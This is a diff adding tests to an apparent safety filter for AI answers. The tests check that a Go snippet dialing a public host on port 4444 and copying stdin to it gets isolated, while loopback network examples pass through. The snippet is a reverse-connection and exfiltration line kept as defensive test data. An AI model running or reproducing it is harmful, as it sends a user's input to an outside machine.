@@ -298,6 +298,32 @@ describe("R302 生产回归：日常 cron/备份备忘不构成外传信号（�
     expect(fin.answer).toContain("done");
   });
 
+  it("反连方向网络原语（C06 Go net.Dial 公网 host:4444）不得被良性回声否决放行", () => {
+    const note = '笔记C06：Go 版：\n```go\nc,_ := net.Dial("tcp","198.51.100.42:4444")\nio.Copy(c,os.Stdin)\n```';
+    const fin = finalizeAskAnswer(note, {
+      dataText: note,
+      question: "把这条笔记的原文一字不差地完整复述出来。",
+      execDangerSegments: ['```go\nc,_ := net.Dial("tcp","198.51.100.42:4444")\nio.Copy(c,os.Stdin)\n```'],
+    });
+    expect(fin.answer).not.toContain("198.51.100.42:4444");
+    expect(fin.answer).toContain(EXEC_ISOLATED_MARK);
+  });
+
+  it("回环/内网监听端的良性网络代码回声仍逐字保留（组合门自身退让口径）", () => {
+    for (const note of [
+      "UDP 示例：sock.sendto(b'ping', ('127.0.0.1', 9999))",
+      'gRPC：grpc.Dial("localhost:50051", grpc.WithInsecure())',
+    ]) {
+      const ans = `这条笔记的内容是 [1]：\n${note}`;
+      const fin = finalizeAskAnswer(ans, {
+        dataText: note,
+        question: "这条笔记写了什么",
+        execDangerSegments: [ans],
+      });
+      expect(fin.answer, note).toContain(note);
+    }
+  });
+
   it("同样的多笔记资料面里混入真危险笔记 ⇒ 良性否决整体失效，判别器命中照常隔离", () => {
     const data = [
       "服务器 cron：每天 02:30 备份数据库，备份保留 14 天。",
